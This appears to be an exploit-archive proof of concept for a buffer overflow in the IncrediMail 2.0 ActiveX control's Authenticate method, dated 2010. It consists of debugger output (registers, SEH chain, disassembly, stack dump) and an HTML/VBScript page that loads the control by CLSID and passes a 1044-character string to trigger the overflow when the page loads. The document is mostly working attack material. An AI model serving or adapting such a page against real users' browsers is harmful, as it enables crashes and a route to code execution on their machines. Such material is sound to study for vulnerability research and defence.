@@ -1,0 +1,107 @@
+IncrediMail 2.0 activeX (Authenticate) bof poc
+
+# by d3b4g
+# Tested: incerdiMail 2.0
+# Vendor url:http://www.incredimail.com/english/splash.aspx
+# Tested on windows XP SP3
+# 1-03-2010
+
+Debugging info
+--------------
+Exception Code: ACCESS_VIOLATION
+Disasm: 678914AE	MOV EDX,[ECX]	(ImSpoolU.dll)
+
+Seh Chain:
+--------------------------------------------------
+1 	678AE129 	ImSpoolU.dll
+2 	678AE3C0 	ImSpoolU.dll
+3 	678AE6D0 	ImSpoolU.dll
+4 	1682950 	VBSCRIPT.dll
+5 	7C839AD8 	KERNEL32.dll
+
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+ImSpoolU.678914AE             8458BEC                       
+
+
+Registers:
+--------------------------------------------------
+EIP 678914AE -> Asc: AUTH
+EAX 018BDA90 -> Asc: AUTH
+EBX 01C00048 -> 678B83EC
+ECX 00000000
+EDX 0018A812 -> F00DBAAD
+EDI 00000006
+ESI 018BDA90 -> Asc: AUTH
+EBP 77124C1B -> 8B55FF8B
+ESP 0013ED24 -> BFA7C790
+
+
+Block Disassembly: 
+--------------------------------------------------
+6789149C	CALL 678A14A0
+678914A1	MOV [ESI+4],EAX
+678914A4	MOV ESI,[ESI+4]
+678914A7	JMP SHORT 678914AB
+678914A9	XOR ESI,ESI
+678914AB	MOV ECX,[EBX+18]
+678914AE	MOV EDX,[ECX]	  <--- CRASH
+678914B0	MOV EAX,[EDX+18]
+678914B3	PUSH 0
+678914B5	PUSH EDI
+678914B6	PUSH ESI
+678914B7	CALL EAX
+678914B9	MOV ESI,EAX
+678914BB	CMP ESI,-1
+678914BE	JNZ SHORT 678914D2
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	0574C085
+EBP+12	D1FC408B
+EBP+16	04C25DE8
+EBP+20	90909000
+EBP+24	FF8B9090
+EBP+28	53EC8B55
+
+
+Stack Dump:
+--------------------------------------------------
+13ED24 90 C7 A7 BF B8 DA 8B 01 48 00 C0 01 48 00 C0 01  [........H...H...]
+13ED34 00 00 00 00 C9 0B 04 80 00 00 00 00 80 ED 13 00  [................]
+13ED44 29 E1 8A 67 FF FF FF FF 3A 28 89 67 48 00 C0 01  [...g.......gH...]
+13ED54 78 ED 13 00 A4 A6 8B 67 C8 0B 04 80 01 00 00 00  [.......g........]
+13ED64 D0 C7 A7 BF 70 50 C0 01 FF FF FF FF 48 00 C0 01  [....pP......H...]
+
+Olly snip
+---------
+http://img41.imageshack.us/img41/5595/incrediblellll.jpg
+
+
+
+
+<HTML>
+<object classid='clsid:032038A5-B655-11D3-BB7D-0050DA276194' id='target' />
+<script language='vbscript'>
+
+'Wscript.echo typename(target)
+
+'for debugging/custom prolog
+targetFile = "C:\Program Files\IncrediMail\Bin\ImSpoolU.dll"
+prototype  = "Sub Authenticate ( ByVal bsServer As String ,  ByVal bsUser As String ,  ByVal bsPassword As String ,  ByVal fSecure As Long )"
+memberName = "Authenticate"
+progid     = "INCREDISPOOLERLib.Pop"
+argCount   = 4
+
+arg1=String(1044, "A")
+arg2="defaultV"
+arg3="defaultV"
+arg4=1
+
+target.Authenticate arg1 ,arg2 ,arg3 ,arg4 
+
+</script>
+</html>
